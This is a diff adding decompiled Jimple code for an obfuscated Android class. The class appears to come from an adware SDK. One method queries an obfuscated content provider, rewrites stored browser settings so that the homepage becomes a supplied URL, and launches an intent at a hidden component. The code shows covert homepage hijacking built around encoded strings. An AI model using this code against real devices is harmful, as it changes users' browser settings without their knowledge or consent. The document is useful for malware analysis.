@@ -1,0 +1,164 @@
+public final class com.apperhand.device.android.a.a.a.a extends com.apperhand.device.android.a.a.a
+{
+
+    public void <init>()
+    {
+        com.apperhand.device.android.a.a.a.a r0;
+
+        r0 := @this: com.apperhand.device.android.a.a.a.a;
+
+        specialinvoke r0.<com.apperhand.device.android.a.a.a: void <init>()>();
+
+        return;
+    }
+
+    public final boolean a(android.content.Context, com.apperhand.common.dto.Homepage)
+    {
+        com.apperhand.device.android.a.a.a.a r0;
+        android.content.Context $r1;
+        com.apperhand.common.dto.Homepage $r2;
+        android.content.ContentResolver $r3;
+        byte[] $r4, $r13;
+        java.lang.String $r5, $r11;
+        android.net.Uri $r6;
+        android.database.Cursor $r7;
+        int $i0, $i1;
+        boolean $z0;
+        android.os.Parcel $r8;
+        android.os.Bundle $r9, $r10;
+        android.content.ContentValues $r12;
+        android.content.Intent $r14;
+        android.content.ComponentName $r15;
+
+        r0 := @this: com.apperhand.device.android.a.a.a.a;
+
+        $r1 := @parameter0: android.content.Context;
+
+        $r2 := @parameter1: com.apperhand.common.dto.Homepage;
+
+        $r3 = virtualinvoke $r1.<android.content.Context: android.content.ContentResolver getContentResolver()>();
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] h>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r6 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r5);
+
+        $r7 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r6, null, null, null, null);
+
+        if $r7 == null goto label3;
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] i>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $i0 = interfaceinvoke $r7.<android.database.Cursor: int getColumnIndexOrThrow(java.lang.String)>($r5);
+
+        $r4 = null;
+
+     label1:
+        $z0 = interfaceinvoke $r7.<android.database.Cursor: boolean moveToNext()>();
+
+        if $z0 == 0 goto label2;
+
+        $r4 = interfaceinvoke $r7.<android.database.Cursor: byte[] getBlob(int)>($i0);
+
+        $r8 = staticinvoke <android.os.Parcel: android.os.Parcel obtain()>();
+
+        $i1 = lengthof $r4;
+
+        virtualinvoke $r8.<android.os.Parcel: void unmarshall(byte[],int,int)>($r4, 0, $i1);
+
+        virtualinvoke $r8.<android.os.Parcel: void setDataPosition(int)>(0);
+
+        $r9 = new android.os.Bundle;
+
+        specialinvoke $r9.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r9.<android.os.Bundle: void readFromParcel(android.os.Parcel)>($r8);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] j>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r10 = virtualinvoke $r9.<android.os.Bundle: android.os.Bundle getBundle(java.lang.String)>($r5);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] k>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r11 = virtualinvoke $r2.<com.apperhand.common.dto.Homepage: java.lang.String getPageURL()>();
+
+        virtualinvoke $r10.<android.os.Bundle: void putString(java.lang.String,java.lang.String)>($r5, $r11);
+
+        $r8 = staticinvoke <android.os.Parcel: android.os.Parcel obtain()>();
+
+        virtualinvoke $r9.<android.os.Bundle: void writeToParcel(android.os.Parcel,int)>($r8, 0);
+
+        $r4 = virtualinvoke $r8.<android.os.Parcel: byte[] marshall()>();
+
+        goto label1;
+
+     label2:
+        interfaceinvoke $r7.<android.database.Cursor: void close()>();
+
+        $r12 = new android.content.ContentValues;
+
+        specialinvoke $r12.<android.content.ContentValues: void <init>()>();
+
+        $r13 = <com.apperhand.device.android.a.a.a.a: byte[] i>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r13);
+
+        virtualinvoke $r12.<android.content.ContentValues: void put(java.lang.String,byte[])>($r5, $r4);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] l>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] m>;
+
+        $r11 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        virtualinvoke $r12.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>($r5, $r11);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] n>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r6 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>($r5);
+
+        virtualinvoke $r3.<android.content.ContentResolver: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>($r6, $r12);
+
+        virtualinvoke $r3.<android.content.ContentResolver: void notifyChange(android.net.Uri,android.database.ContentObserver)>($r6, null);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] e>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r14 = staticinvoke <com.apperhand.device.android.a.a.a.a: android.content.Intent a(java.lang.String)>($r5);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] o>;
+
+        $r5 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        $r4 = <com.apperhand.device.android.a.a.a.a: byte[] g>;
+
+        $r11 = staticinvoke <com.apperhand.device.android.a.a.a.a: java.lang.String a(byte[])>($r4);
+
+        virtualinvoke $r11.<java.lang.String: byte[] getBytes()>();
+
+        virtualinvoke $r5.<java.lang.String: byte[] getBytes()>();
+
+        $r15 = new android.content.ComponentName;
+
+        specialinvoke $r15.<android.content.ComponentName: void <init>(java.lang.String,java.lang.String)>($r5, $r11);
+
+        virtualinvoke $r14.<android.content.Intent: android.content.Intent setComponent(android.content.ComponentName)>($r15);
+
+        staticinvoke <com.apperhand.device.android.a.a.a.a: void a(android.content.Context,android.content.Intent)>($r1, $r14);
+
+     label3:
+        return 1;
+    }
+}
